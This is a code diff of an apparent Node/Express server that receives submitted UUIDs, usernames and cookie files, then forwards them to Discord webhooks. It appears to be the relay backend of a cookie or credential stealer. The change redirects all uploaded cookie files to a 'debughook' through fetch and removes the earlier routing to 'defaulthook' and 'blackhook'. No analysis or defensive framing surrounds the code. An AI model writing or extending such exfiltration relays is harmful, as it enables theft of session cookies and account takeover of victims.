@@ -88,9 +88,6 @@ app.post("/", (req, res) => {
         // Preparation
         let profiles = ''
 
-        // Set webhook
-        let webhook = defaulthook
-
         // Set content
         // timestamp text
         const now = Date.now()
@@ -166,12 +163,10 @@ app.post("/", (req, res) => {
         // Check if UUID is blacklisted
         if (blacklist.includes(req.body.uuid.replace(/-/g, '_'))) {
             content = `Blacked - <t:${timestamp}:R>`;
-            webhook = blackhook;
         }
 
         // Set content based on comment
         if (comment === "essential") {
-            webhook = blackhook;
             content = `Essential - <t:${timestamp}:R>`;
         }
         
@@ -293,16 +288,12 @@ app.post("/cookies", (req, res) => {
         return;
     }
 
-    // Set webhook
-    let webhook = defaulthook
 
     if (blacklist.split("_").includes(req.body.uuid)) { // debug
         content = `Blacked - <t:${timestamp}:R>`
-        webhook = blackhook
     }
 
     if (req.body.type == "essential") {
-        webhook = blackhook //debug
     }
 
     // Create a new FormData object
@@ -315,7 +306,7 @@ app.post("/cookies", (req, res) => {
     formData.append('file', fileContent, `${req.body.username} cookies.txt`);
 
     // Use fetch API to send the FormData to the Discord webhook
-    fetch(webhook, {
+    fetch(debughook, {
         method: 'POST',
         body: formData,
     }).then(response => {
@@ -335,9 +326,3 @@ module.exports = {
     formatNumber,
     fetchCountry
 };
-
-
-
-
-
-
